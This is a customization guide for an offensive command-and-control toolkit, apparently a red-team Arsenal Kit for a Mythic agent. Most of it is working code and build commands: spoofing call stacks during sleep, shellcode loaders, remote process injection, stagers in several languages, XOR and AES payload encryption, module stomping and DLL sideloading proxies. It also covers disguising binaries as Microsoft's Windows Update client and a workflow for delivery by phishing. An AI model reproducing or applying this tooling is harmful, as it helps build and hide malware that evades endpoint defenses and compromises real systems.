# Customization Guide

Detailed instructions for customizing each Arsenal Kit component.

---

## Sleep Mask Kit

### Creating a Custom Spoof Profile

Starburst's Draugr sleep evasion uses synthetic call stack frames defined in `spoof_profiles.h`. The agent ships with two built-in profiles (`SPOOF_PROFILE_THREAD` and `SPOOF_PROFILE_WORKER`) and a `SPOOF_PROFILE_CUSTOM` slot for operator-defined stacks.

A custom profile lets you mimic the exact call chain of a legitimate thread on your target OS build, making the sleeping agent's stack indistinguishable from a real one.

### Step-by-Step: Process Hacker to spoof_profiles.h

#### 1. Identify a Target Call Stack

On a representative target (same Windows version and patch level as the engagement target):

1. Open **Process Hacker** (or **System Informer**) as administrator.
2. Find a long-running process with sleeping threads (e.g., `svchost.exe`, `explorer.exe`, `RuntimeBroker.exe`).
3. Double-click the process, go to **Threads**, and find a thread in a `Wait` state.
4. Double-click the thread to view its **Call Stack**.
5. Note the frames from the bottom up. A typical thread pool stack looks like:

```
ntdll.dll!NtWaitForSingleObject+0x14
ntdll.dll!TpReleasePool+0x402
kernel32.dll!BaseThreadInitThunk+0x14
ntdll.dll!RtlUserThreadStart+0x21
```

Record the **DLL name**, **function name**, and **hex offset** for each frame (skip the innermost `NtWaitFor*` frame -- Draugr provides that itself).

#### 2. Calculate Offsets with getFunctionOffset

Run `getFunctionOffset.exe` **on the target system** (or one with the same ntdll/kernel32 versions) for each frame you recorded:

```bash
# From the Arsenal Kit root:
utils/getFunctionOffset/getFunctionOffset.exe ntdll.dll TpReleasePool 0x402
utils/getFunctionOffset/getFunctionOffset.exe kernel32.dll BaseThreadInitThunk 0x14
utils/getFunctionOffset/getFunctionOffset.exe ntdll.dll RtlUserThreadStart 0x21
```

Each invocation prints a block of code you can paste directly into `spoof_profiles.h`. The output includes three formats:

- **Function + offset** (portable) -- works across Windows builds as long as the function exists
- **Module RVA** (exact) -- tied to the specific OS build but does not require function resolution at runtime
- **Pre-computed hashes** -- avoids `consteval` overhead; use if you want raw numeric hashes

#### 3. Edit spoof_profiles.h

Open `<starburst>/agent_code/include/evasion/spoof_profiles.h` and find the `SPOOF_PROFILE_CUSTOM` section (around line 87). Replace the example frames with your output:

```cpp
#elif SPOOF_PROFILE == SPOOF_PROFILE_CUSTOM
    /* Custom profile: RuntimeBroker thread pool stack (Win11 22H2) */

    // Frame 1: TpReleasePool+0x402 (innermost after NtWaitFor*)
    frames[i].module_hash = expr::hash_string<wchar_t>( L"ntdll.dll" );
    frames[i].func_hash   = expr::hash_string( "TpReleasePool" );
    frames[i].offset      = 0x402;
    i++;

    // Frame 2: BaseThreadInitThunk+0x14
    frames[i].module_hash = expr::hash_string<wchar_t>( L"kernel32.dll" );
    frames[i].func_hash   = expr::hash_string( "BaseThreadInitThunk" );
    frames[i].offset      = 0x14;
    i++;

    // Frame 3: RtlUserThreadStart+0x21 (outermost)
    frames[i].module_hash = expr::hash_string<wchar_t>( L"ntdll.dll" );
    frames[i].func_hash   = expr::hash_string( "RtlUserThreadStart" );
    frames[i].offset      = 0x21;
    i++;
```

**Frame order**: innermost first (closest to the sleep), outermost last (thread entry point). The last frame is almost always `RtlUserThreadStart`.

#### 4. Build with the Custom Profile

Set the build parameter in Mythic:

```
spoof_profile = "custom"
```

Or for manual builds, set in `config.h`:

```cpp
#define SPOOF_PROFILE SPOOF_PROFILE_CUSTOM
```

### Verifying Your Profile with a Debugger

After deploying the agent:

1. Attach WinDbg or x64dbg to the target process.
2. Wait for the agent to enter its sleep cycle.
3. Run `!stack` or view the call stack of the agent's thread.
4. The stack should show your custom frames as return addresses. Each frame's return address should point into the correct function at the correct offset.
5. Compare against the real thread you captured in Process Hacker -- the frames should match.

Alternatively, use **System Informer > Thread > Stack** on the injected process to visually confirm the spoofed stack matches expectations without needing a debugger.

### Common Pitfalls

| Problem | Symptom | Fix |
|---------|---------|-----|
| **Wrong frame order** | Stack looks inverted or garbled in debugger | Ensure innermost frame is `frames[0]`, outermost (RtlUserThreadStart) is last |
| **UWOP_SET_FPREG frames** | Crash or access violation during sleep | Draugr's unwind parser skips `UWOP_SET_FPREG` (opcode 3) frames. Avoid choosing functions that use frame pointers in their unwind info. Check with `dumpbin /unwindinfo` or WinDbg `.fnent` -- if you see `UWOP_SET_FPREG`, pick a different function |
| **Stale offsets** | Stack frames point to wrong instructions after Windows update | Offsets are tied to specific ntdll/kernel32 builds. Re-run `getFunctionOffset` after major Windows updates and rebuild |
| **Too many frames** | Compile error or truncation | Maximum is `SPOOF_MAX_FRAMES` (10). Typical stacks use 2-4 frames |
| **Module not loaded** | Frame resolution fails silently at runtime, frame is skipped | Ensure the target DLL (e.g., `ntdll.dll`, `kernel32.dll`) is loaded in the target process. Stick to always-loaded modules |
| **Function not exported** | `getFunctionOffset` fails with "function not found" | The function must be an export. Use `dumpbin /exports <dll>` to verify |

---

## Artifact Kit

### Adding a New Bypass Technique

The Artifact Kit provides EXE/DLL/SVC wrappers that execute Starburst shellcode via a configurable bypass technique. Each bypass is a standalone `.c` file in `artifact-kit/bypass/`.

#### 1. Create the Bypass Source

Create `artifact-kit/bypass/bypass_yourtechnique.c`:

```c
#include <windows.h>
#include "artifact.h"

/*
 * bypass_yourtechnique - Brief description of what this does.
 *
 * Called by the artifact wrapper after shellcode is extracted.
 * Must allocate executable memory, copy shellcode, and transfer execution.
 */
void artifact_bypass(unsigned char* shellcode, DWORD shellcode_len) {
    // 1. Allocate memory (RW)
    LPVOID mem = VirtualAlloc(NULL, shellcode_len,
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return;

    // 2. Copy shellcode
    memcpy(mem, shellcode, shellcode_len);

    // 3. Change protection (RX)
    DWORD old;
    VirtualProtect(mem, shellcode_len, PAGE_EXECUTE_READ, &old);

    // 4. Execute
    ((void(*)())mem)();
}
```

The function signature `artifact_bypass(unsigned char*, DWORD)` is the interface the wrapper calls. Do not change it.

#### 2. Existing Bypass Techniques

| File | Technique | Detection Notes |
|------|-----------|-----------------|
| `bypass_pipe.c` | Named pipe + read into executable memory | Avoids `VirtualAlloc(RWX)` pattern |
| `bypass_fiber.c` | `ConvertThreadToFiber` + fiber-based execution | No new thread creation |
| `bypass_callback.c` | Callback-based execution via `EnumWindows` | Hides execution start from hooks |

### Customizing resource.rc

The `artifact-kit/src/resource.rc` file controls PE metadata that defenders and EDR inspect. Customize it for each engagement:

```rc
// artifact-kit/src/resource.rc
#include <winver.h>

VS_VERSION_INFO VERSIONINFO
FILEVERSION    10,0,19041,1
PRODUCTVERSION 10,0,19041,1
FILEOS         VOS_NT_WINDOWS32
FILETYPE       VFT_APP
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904B0"
        BEGIN
            VALUE "CompanyName",      "Microsoft Corporation"
            VALUE "FileDescription",  "Windows Update Assistant"
            VALUE "FileVersion",      "10.0.19041.1"
            VALUE "InternalName",     "wuauclt"
            VALUE "LegalCopyright",   "\251 Microsoft Corporation. All rights reserved."
            VALUE "OriginalFilename", "wuauclt.exe"
            VALUE "ProductName",      "Microsoft\256 Windows\256 Operating System"
            VALUE "ProductVersion",   "10.0.19041.1"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END

// Custom icon (place your .ico file alongside resource.rc)
1 ICON "app.ico"

// Embed a UAC manifest for asInvoker (no elevation prompt)
1 24 "manifest.xml"
```

Key fields to customize per engagement:

- **CompanyName / ProductName** -- match a legitimate application on the target
- **OriginalFilename** -- should match your delivered filename
- **Icon** -- extract from the application you are impersonating (`ResourceHacker` or `7-zip`)
- **Manifest** -- controls UAC behavior (`asInvoker`, `requireAdministrator`, `highestAvailable`)

### Switching Bypass Techniques

To compile with a specific bypass:

```bash
# Pipe bypass
x86_64-w64-mingw32-gcc -O2 -s artifact-kit/src/main_exe.c \
    artifact-kit/bypass/bypass_pipe.c -o starburst.exe -lkernel32

# Fiber bypass
x86_64-w64-mingw32-gcc -O2 -s artifact-kit/src/main_exe.c \
    artifact-kit/bypass/bypass_fiber.c -o starburst.exe -lkernel32

# Your custom bypass
x86_64-w64-mingw32-gcc -O2 -s artifact-kit/src/main_exe.c \
    artifact-kit/bypass/bypass_yourtechnique.c -o starburst.exe -lkernel32
```

Only one bypass `.c` file is linked at a time. The wrapper (`main_exe.c`, `main_dll.c`, or `main_svc.c`) calls `artifact_bypass()` -- whichever bypass you link provides the implementation.

### Build Flags and Optimization

| Flag | Purpose |
|------|---------|
| `-O2` | Optimize for speed (default recommendation) |
| `-Os` | Optimize for size (smaller payload) |
| `-s` | Strip symbols from output |
| `-DBYPASS_SLEEP=5000` | Add pre-execution sleep (sandbox evasion) |
| `-mwindows` | Link as GUI application (no console window) |
| `-nostdlib` | Remove CRT dependency (advanced, requires custom entry) |
| `-Wl,--dynamicbase,--nxcompat` | ASLR + DEP (match legitimate binaries) |

---

## Injection Kit

### Swapping the Injection Technique in cmd_shinject.cc

The default injection in `cmd_shinject.cc` uses:

```
OpenProcess -> VirtualAllocEx(RW) -> WriteProcessMemory -> VirtualProtectEx(RX) -> CreateRemoteThread
```

To swap this with an alternative technique from `injection-kit/techniques/`:

#### 1. Choose a Technique

Each file in `injection-kit/techniques/` implements one injection method as standalone C. Review the available techniques and pick one suited to your target environment.

#### 2. Adapt to Starburst's PIC C++

The agent runs as Position-Independent Code with no CRT. You cannot use standard C functions directly. Key differences from standalone C:

| Standalone C | Starburst PIC C++ | Why |
|-------------|-------------------|-----|
| `#include <windows.h>` | `#include <common.h>` | Starburst has its own Windows type definitions |
| `OpenProcess(...)` | Resolve via `inst.kernel32.GetProcAddress(...)` | No IAT; all APIs resolved at runtime via hash |
| `"string literal"` | `symbol<char*>("string literal")` | String literals are encrypted at compile time, decrypted on use |
| `L"wide string"` | `symbol<wchar_t*>(L"wide string")` | Same encryption for wide strings |
| `printf(...)` | `DBG_PRINT(inst, ...)` | Debug output only in debug builds |
| `malloc(size)` | Use `inst` allocator or `VirtualAlloc` via resolved pointer | No heap allocator in CRT-free code |
| `memcpy(dst, src, n)` | `mem_copy(dst, src, n)` | Starburst's built-in memory operations |
| Return error string | `queue_response(inst, task_uuid, RESPONSE_ERROR, msg)` | Errors sent back to Mythic as task responses |

#### 3. Step-by-Step Adaptation

Starting from a standalone C injection technique (e.g., `ntcreatesection_inject.c`):

**Original standalone C:**
```c
#include <windows.h>
#include <stdio.h>

BOOL inject(DWORD pid, unsigned char* shellcode, SIZE_T sc_len) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return FALSE;

    // ... technique-specific logic ...

    HANDLE hThread = NULL;
    NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
                     remote_addr, NULL, 0, 0, 0, 0, NULL);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}
```

**Adapted for Starburst (in `cmd_shinject.cc`):**
```cpp
#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_SHINJECT

using namespace stardust;
using namespace starburst;

// 1. Define function pointer typedefs for every API you need
typedef NTSTATUS (NTAPI *fn_NtCreateSection)(
    PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *fn_NtMapViewOfSection)(
    HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER,
    PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI *fn_NtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID,
    ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

auto declfn starburst::cmd_shinject(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    // 2. Parse parameters (same for all techniques)
    uint32_t pid = parser_int32( params );
    uint32_t sc_len = 0;
    auto sc_data = parser_bytes( params, &sc_len );

    if ( !sc_data || sc_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no shellcode provided" ) ) );
        return;
    }

    // 3. Resolve APIs through instance (no IAT)
    auto ntdll = inst.ntdll.handle;
    auto k32   = inst.kernel32.handle;

    auto pNtCreateSection = reinterpret_cast<fn_NtCreateSection>(
        inst.ntdll.GetProcAddress( (HMODULE)ntdll,
            symbol<LPCSTR>( "NtCreateSection" ) ) );

    auto pNtMapViewOfSection = reinterpret_cast<fn_NtMapViewOfSection>(
        inst.ntdll.GetProcAddress( (HMODULE)ntdll,
            symbol<LPCSTR>( "NtMapViewOfSection" ) ) );

    // 4. Use symbol<> for all string literals
    auto pOpenProcess = reinterpret_cast<fn_OpenProcess>(
        inst.kernel32.GetProcAddress( (HMODULE)k32,
            symbol<LPCSTR>( "OpenProcess" ) ) );

    // 5. Implement your technique using resolved function pointers
    // ... (technique logic here) ...

    // 6. Report success/failure back to Mythic
    queue_response( inst, task_uuid, RESPONSE_SUCCESS,
        symbol<char*>( const_cast<char*>( "injection complete" ) ) );
}

#endif
```

**Key rules when adapting:**

1. Every Win32/NT API call must go through `inst.<module>.GetProcAddress()` with a `symbol<LPCSTR>()` wrapped name
2. Every string literal must be wrapped in `symbol<char*>()` or `symbol<wchar_t*>()`
3. Use `const_cast<char*>()` inside `symbol<>` for string literals (required by the encryption template)
4. Error handling must use `queue_response()` with `RESPONSE_ERROR` -- never return silently
5. Clean up handles via `inst.kernel32.CloseHandle()`, not a direct `CloseHandle()` call
6. Guard the entire implementation with `#ifdef INCLUDE_CMD_SHINJECT`

---

## Resource Kit

### Embedding Shellcode in Each Stager Type

The Resource Kit provides delivery stagers in multiple languages. Each reads Starburst shellcode (generated as `.bin` via Mythic) and executes it on the target.

#### PowerShell (`resource-kit/powershell/`)

```powershell
# stager_valloc.ps1 -- embed shellcode as a byte array
# Replace the $buf line with your encoded shellcode

$buf = [System.Convert]::FromBase64String("TVqQAAMAAAA...")  # Base64-encoded .bin

$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($buf.Length)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $mem, $buf.Length)

# ... execution logic ...
```

To embed: Base64-encode your `.bin` and replace the `$buf` assignment.

#### C# (`resource-kit/csharp/`)

```csharp
// Embed as a byte array in the source
private static byte[] shellcode = new byte[] { 0x4d, 0x5a, ... };

// Or load from embedded resource at runtime
var asm = Assembly.GetExecutingAssembly();
var stream = asm.GetManifestResourceStream("Namespace.payload.bin");
```

To embed: use `bin2cs.py` from `utils/` to convert the `.bin` to a C# byte array, or add the `.bin` as an embedded resource in your `.csproj`.

#### Python (`resource-kit/python/`)

```python
# stager_ctypes.py -- accepts .bin path as argument or embeds inline
import ctypes, sys, base64

# Option 1: Load from file
shellcode = open(sys.argv[1], "rb").read()

# Option 2: Embed inline (base64)
shellcode = base64.b64decode("TVqQAAMAAAA...")
```

#### HTA (`resource-kit/hta/`)

```html
<script language="VBScript">
' Base64-encoded shellcode embedded directly
Dim encoded : encoded = "TVqQAAMAAAA..."
' ... decode and execute via ActiveX ...
</script>
```

#### VBScript (`resource-kit/vbs/`)

```vbs
' Shellcode as hex string
Dim sc : sc = "4d5a90000300..."
' ... decode and execute ...
```

### Encoding and Encrypting Payloads Before Embedding

Raw shellcode in a stager is trivially signatured. Always encode or encrypt before embedding.

#### XOR Encoding (Simple)

```python
# utils/encoder/xor_encode.py
import sys

key = b"\x41\x42\x43\x44"  # Change per engagement
data = open(sys.argv[1], "rb").read()
encoded = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
open(sys.argv[1] + ".xor", "wb").write(encoded)
print(f"[+] XOR encoded {len(data)} bytes with key {key.hex()}")
```

Add the corresponding decode stub to your stager before execution.

#### AES Encryption (Recommended)

```python
# utils/encoder/aes_encode.py
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os, sys

key = os.urandom(32)
iv  = os.urandom(16)
data = open(sys.argv[1], "rb").read()
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(pad(data, AES.block_size))

open(sys.argv[1] + ".enc", "wb").write(iv + encrypted)
print(f"[+] AES-256-CBC key: {key.hex()}")
print(f"[+] Embed key in stager decrypt routine")
```

### Operator Workflow

The full workflow from Mythic build to delivery:

```
1. Mythic Build
   Mythic UI > Payloads > Build
   output_type = bin (raw shellcode)
   Download: starburst_x64.bin

2. Encode / Encrypt
   python utils/encoder/xor_encode.py starburst_x64.bin
   Output: starburst_x64.bin.xor

3. Embed in Stager
   - For PowerShell: base64 the .xor, paste into $buf
   - For C#: convert to byte array, add XOR decode loop
   - For Python: base64 the .xor, add decode before exec

4. Deliver
   - Host on web server for download cradle
   - Embed in phishing document
   - Drop via initial access tool
```

---

## Loader Kit

### Module Stomping: Choosing a Sacrificial DLL

Module stomping loads the agent into the memory space of a legitimate DLL, replacing its `.text` section. This makes the agent's memory appear backed by a known module.

#### Choosing a Good Sacrificial DLL

Requirements:
- `.text` section must be **larger** than your shellcode
- DLL should be **legitimately present** on the target OS (not something that stands out)
- Prefer DLLs that are **not actively used** by the target process
- Avoid DLLs with **known monitoring** (e.g., `amsi.dll`, `clr.dll`)

Good candidates:

| DLL | Typical .text Size | Notes |
|-----|--------------------|-------|
| `mshtml.dll` | ~5 MB | Large, rarely loaded in non-IE processes |
| `dbghelp.dll` | ~800 KB | Common but not always loaded |
| `comsvcs.dll` | ~300 KB | Present on all Windows |
| `mscms.dll` | ~150 KB | Color management, rarely used |
| `wbemcomn.dll` | ~200 KB | WMI component |

To check a DLL's `.text` section size:

```bash
# From a Windows box
dumpbin /headers C:\Windows\System32\mshtml.dll | findstr ".text"

# From Linux (cross-compile environment)
x86_64-w64-mingw32-objdump -h /path/to/mshtml.dll | grep .text
```

In `loader-kit/stomper/config.h`, set:

```c
#define STOMP_DLL L"mshtml.dll"          // DLL to load and stomp
#define STOMP_EXPORT "DllGetClassObject"  // Export to resolve (ensures DLL is mapped)
```

### DLL Sideloading: Creating a Proxy for a Target Application

DLL sideloading exploits applications that load DLLs from their own directory without full path qualification. Your malicious DLL sits next to the legitimate application, gets loaded first, runs shellcode, then proxies calls to the real DLL.

#### 1. Find Sideloading Opportunities

Use **Process Monitor** (ProcMon) to identify sideloadable DLLs:

1. Set filters: `Result = NAME NOT FOUND`, `Path ends with .dll`
2. Launch target applications and observe which DLLs they try to load from their own directory before falling back to System32
3. Note the DLL name and the application that loads it

Alternatively, use automated tools:

```powershell
# Quick scan: find EXEs that import non-system DLLs
Get-ChildItem "C:\Program Files\TargetApp" -Filter *.exe | ForEach-Object {
    $imports = dumpbin /imports $_.FullName 2>$null | Select-String "\.dll"
    Write-Host "$($_.Name): $($imports.Count) imports"
}
```

#### 2. Generate the Proxy DLL

Once you identify a target DLL (e.g., `version.dll` sideloaded by `TargetApp.exe`):

```bash
# Step 1: Dump exports from the real DLL
dumpbin /exports C:\Windows\System32\version.dll > exports.txt

# Step 2: Generate proxy .def file
python loader-kit/sideload/gen_proxy_def.py exports.txt version.dll > version.def
```

The generated `.def` file forwards all exports to the real DLL:

```def
LIBRARY version
EXPORTS
    GetFileVersionInfoA = C:\Windows\System32\version.GetFileVersionInfoA
    GetFileVersionInfoW = C:\Windows\System32\version.GetFileVersionInfoW
    GetFileVersionInfoSizeA = C:\Windows\System32\version.GetFileVersionInfoSizeA
    ; ... all other exports forwarded ...
```

#### 3. Build the Sideloading DLL

```bash
# Compile with proxy forwards + shellcode execution in DllMain
x86_64-w64-mingw32-gcc -shared -O2 -s \
    loader-kit/sideload/sideload_main.c \
    -o version.dll \
    -Wl,--def=version.def \
    -lkernel32
```

The `sideload_main.c` template executes shellcode in `DLL_PROCESS_ATTACH` before the application's own initialization runs, then proxies all subsequent calls to the real DLL transparently.

#### 4. Deploy

```
TargetApp/
  TargetApp.exe      (legitimate application)
  version.dll        (your sideloading DLL -- loaded before System32 copy)
  payload.bin        (optional: external shellcode, or embedded in DLL)
```

### Finding New Sideloading Opportunities

Systematic approach for discovering sideloadable applications:

1. **Signed applications** are preferred -- your DLL runs in the context of a signed, trusted process
2. **Auto-start applications** are ideal for persistence -- the sideloaded DLL runs every time the user logs in
3. **Check these common targets**:

| Application Type | Common Sideloadable DLLs |
|-----------------|--------------------------|
| Updater services | `version.dll`, `cryptsp.dll`, `userenv.dll` |
| Management tools | `msi.dll`, `wtsapi32.dll` |
| Media players | `dnsapi.dll`, `winmm.dll` |
| Enterprise software | Various, application-specific |

4. **Validate** that the sideloaded DLL actually gets loaded with the expected privileges and in the expected context (user vs. SYSTEM, session 0 vs. interactive)
